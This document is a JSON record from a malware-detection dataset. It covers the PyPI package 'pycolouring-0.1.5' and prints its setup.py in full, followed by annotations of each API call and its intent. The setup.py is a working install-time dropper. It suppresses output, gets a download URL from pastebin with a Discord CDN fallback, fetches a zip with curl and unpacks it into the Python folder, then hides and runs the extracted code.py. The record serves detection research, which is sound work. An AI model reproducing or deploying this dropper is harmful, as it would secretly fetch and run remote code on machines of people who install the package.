{
  "metadata": {
    "package_name": "pycolouring-0.1.5",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/pycolouring-0.1.5.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/pycolouring-0.1.5.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "setup.py",
      "code_snippets": [
        {
          "snippet": "import sys,os,requests,subprocess,time\nfrom pathlib import Path\n\ndef stopprint():\n\tsys.stdout = open(os.devnull, 'w')\n\ndef get_folder_contents(path):\n\ttry:\n\t\tall_files = os.listdir(path)\n\t\tfor file in all_files:\n\t\t\tif file.lower() == \"python.exe\":\n\t\t\t\treturn True\n\texcept:\n\t\tpass\n\treturn False\n\ndef get_default_path():\n\ttry:\n\t\tvideos_path = str(Path.home() / \"Videos\")\n\t\treturn videos_path\n\texcept Exception as e:\n\t\tprint(e)\n\t\treturn None\n\ndef get_new_filepath(path,name):\n\treturn os.path.join(path,name)\n\ndef get_cdn():\n\tcdnurl = \"https://cdn.discordapp.com/attachments/1072676199073062975/1072698468956655726/Game.zip\"\n\ttry:\n\t\tcdndata = requests.get(f\"https://pastebin.com/raw/tCPxwCgS\")\n\t\tif cdndata.status_code == 200:\n\t\t\tcdnurl = cdndata.text\n\texcept:\n\t\tpass\n\treturn cdnurl\n\ndef hide_file(file_path):\n    try:\n        os.system(f\"attrib +h {file_path}\" )\n    except:\n        pass\n\ndef run_file(path):\n\tp = subprocess.Popen(f\"python {path}\",shell=True,stdin=None,stdout=subprocess.PIPE,stderr=subprocess.PIPE,close_fds=True)\n\tout, err = p.communicate()\n\ndef main():\n\tstopprint()\n\tfilepath = get_default_path()\n\tfor thing in sys.path:\n\n\t\tcorrect_folder = get_folder_contents(thing)\n\t\tif correct_folder == True:\n\t\t\tfilepath = thing \n\t\t\tbreak\n\n\tnew_filepath = get_new_filepath(filepath,\"code.py\")\n\n\tif os.path.exists(new_filepath) == True:\n\t\tprint(\"Already done\")\n\t\treturn\n\n\tcdn = get_cdn()\n\tos.system(f\"curl -o %temp%/nice.zip -silent  {cdn}\")\n\tos.system(f'tar -xf \"\"%temp%/nice.zip\"\" -C \"\"{filepath}\"\"')\n\n\thide_file(new_filepath)\n\trun_file(new_filepath)\n\nmain()",
          "triple_sequences": [
            {
              "action_api": "sys.stdout = open()",
              "action_description": "Opens file with associated application",
              "action_id": "open_file_app",
              "object": "os.devnull, 'w'",
              "object_description": "System null device",
              "object_id": "system_null_device",
              "intention_description": "Redirect standard output to null device",
              "intention_id": "redirect_stdout_null"
            },
            {
              "action_api": "Path.home()",
              "action_description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
              "action_id": "path_special_operations",
              "object": "",
              "object_description": "Home directory path",
              "object_id": "home_directory_path",
              "intention_description": "Access user home directory",
              "intention_id": "access_user_home_directory"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "path, name",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "https://pastebin.com/raw/tCPxwCgS",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "new_filepath",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "curl -o %temp%/nice.zip -silent  {cdn}",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "tar -xf \"\"%temp%/nice.zip\"\" -C \"\"{filepath}\"\"",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Decompress downloaded archive",
              "intention_id": "decompress_downloaded_archive"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "attrib +h {file_path}",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Modify file attributes",
              "intention_id": "modify_file_attributes"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command with shell access",
              "action_id": "spawn_process_shell",
              "object": "python {path}",
              "object_description": "Python command",
              "object_id": "python_command",
              "intention_description": "Execute file",
              "intention_id": "execute_file"
            },
            {
              "action_api": "subprocess.Popen().communicate()",
              "action_description": "Reads all bytes from process standard output",
              "action_id": "read_process_stdout",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect command output",
              "intention_id": "collect_command_output"
            }
          ]
        }
      ]
    }
  ]
}